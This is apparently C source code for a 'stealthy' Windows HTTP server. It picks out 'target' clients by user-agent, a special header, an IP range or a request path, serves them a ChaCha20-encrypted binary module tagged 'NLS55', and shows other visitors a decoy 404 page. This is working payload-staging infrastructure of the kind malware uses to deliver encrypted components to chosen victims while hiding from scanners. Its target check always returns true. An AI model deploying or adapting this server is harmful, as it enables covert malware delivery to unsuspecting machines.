#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#pragma comment(lib, "ws2_32.lib")

#define PORT 5000
#define BUFFER_SIZE 4096
#define NLS55_SIGNATURE "\x4E\x4C\x53\x35\x35"  // "NLS55" in hex

extern void* chacha20_Full(void* message, void* buffer, uint64_t length);

// Function to read binary file
int read_binary_file(const char* filename, char** buffer, size_t* file_size) {
    FILE* file = fopen(filename, "rb");
    if (!file) {
        return -1;
    }
    
    fseek(file, 0, SEEK_END);
    *file_size = ftell(file);
    fseek(file, 0, SEEK_SET);
    
    *buffer = (char*)malloc(*file_size + strlen(NLS55_SIGNATURE));
    if (!*buffer) {
        fclose(file);
        return -1;
    }
    
    // Add NLS55 signature at beginning
    memcpy(*buffer, NLS55_SIGNATURE, strlen(NLS55_SIGNATURE));
    
    // Read file content after signature
    size_t bytes_read = fread(*buffer + strlen(NLS55_SIGNATURE), 1, *file_size, file);
    fclose(file);
    
    if (bytes_read != *file_size) {
        free(*buffer);
        return -1;
    }

    //Encrypt the binary content after the signature using ChaCha20
    chacha20_Full(*buffer + strlen(NLS55_SIGNATURE), *buffer + strlen(NLS55_SIGNATURE), *file_size);
    
    *file_size += strlen(NLS55_SIGNATURE);
    return 0;
}

// Check if request is from target (you can customize this detection)
int is_target_client(const char* request, struct sockaddr_in* client_addr) {
    // Example detection methods (customize as needed):
    
    // 1. Check for specific User-Agent
    if (strstr(request, "Mozilla/5.0 (Target-Browser)")) {
        return 1;
    }
    
    // 2. Check for specific header
    if (strstr(request, "X-Special-Token: TARGET_CLIENT")) {
        return 1;
    }
    
    // 3. Check specific IP range (example: 192.168.1.100-150)
    unsigned char* ip = (unsigned char*)&client_addr->sin_addr.s_addr;
    if (ip[0] == 192 && ip[1] == 168 && ip[2] == 1 && ip[3] >= 100 && ip[3] <= 150) {
        return 1;
    }
    
    // 4. Check for specific request path
    if (strstr(request, "GET /special_download.bin")) {
        return 1;
    }
    
    return 1;
}

// Send normal HTTP response
void send_normal_response(SOCKET client_socket) {
    const char* response = 
        "HTTP/1.1 404 Not Found\r\n"
        "Content-Type: text/html\r\n"
        "Connection: close\r\n"
        "\r\n"
        "<html><body><h1>404 Not Found</h1></body></html>";
    
    send(client_socket, response, strlen(response), 0);
}

// Send binary with NLS55 signature
void send_binary_response(SOCKET client_socket, const char* filename) {
    char* file_buffer = NULL;
    size_t file_size = 0;
    
    if (read_binary_file(filename, &file_buffer, &file_size) == 0) {
        // Prepare HTTP headers for binary response
        char header[512];
        snprintf(header, sizeof(header),
            "HTTP/1.1 200 OK\r\n"
            "Content-Type: application/octet-stream\r\n"
            "Content-Length: %zu\r\n"
            "Connection: close\r\n"
            "\r\n", file_size);
        
        // Send headers
        send(client_socket, header, strlen(header), 0);
        
        // Send binary data with NLS55 signature
        send(client_socket, file_buffer, file_size, 0);
        
        free(file_buffer);
        printf("[+] Sent binary with NLS55 signature to target\n");
    } else {
        // Fallback to normal response if file not found
        printf("[-] Binary file not found, sending normal response\n");
        send_normal_response(client_socket);
    }
}

// Handle client connection
void handle_client(SOCKET client_socket, struct sockaddr_in client_addr) {
    char buffer[BUFFER_SIZE];
    int bytes_received;
    
    // Receive HTTP request
    bytes_received = recv(client_socket, buffer, BUFFER_SIZE - 1, 0);
    if (bytes_received > 0) {
        buffer[bytes_received] = '\0';
        
        printf("[+] Received request from %s:%d\n", 
               inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));
        
        // Check if this is a target client
        if (is_target_client(buffer, &client_addr)) {
            printf("[!] Target detected - sending modified binary\n");
            send_binary_response(client_socket, "testModule.obj");
        } else {
            printf("[+] Normal client - sending regular response\n");
            send_normal_response(client_socket);
        }
    }
    
    closesocket(client_socket);
}

int main() {
    WSADATA wsaData;
    SOCKET server_socket, client_socket;
    struct sockaddr_in server_addr, client_addr;
    int client_addr_len = sizeof(client_addr);
    
    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("WSAStartup failed: %d\n", WSAGetLastError());
        return 1;
    }
    
    // Create socket
    server_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (server_socket == INVALID_SOCKET) {
        printf("Socket creation failed: %d\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }
    
    // Setup server address
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);
    
    // Bind socket
    if (bind(server_socket, (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        printf("Bind failed: %d\n", WSAGetLastError());
        closesocket(server_socket);
        WSACleanup();
        return 1;
    }
    
    // Listen for connections
    if (listen(server_socket, SOMAXCONN) == SOCKET_ERROR) {
        printf("Listen failed: %d\n", WSAGetLastError());
        closesocket(server_socket);
        WSACleanup();
        return 1;
    }
    
    printf("[+] Stealthy HTTP server listening on port %d\n", PORT);
    printf("[+] Waiting for connections...\n");
    
    // Main server loop
    while (1) {
        client_socket = accept(server_socket, (struct sockaddr*)&client_addr, &client_addr_len);
        if (client_socket == INVALID_SOCKET) {
            printf("Accept failed: %d\n", WSAGetLastError());
            continue;
        }
        
        // Handle client in the main thread (for simplicity)
        // In production, use threads for multiple clients
        handle_client(client_socket, client_addr);
    }
    
    // Cleanup (unreachable in this simple example)
    closesocket(server_socket);
    WSACleanup();
    return 0;
}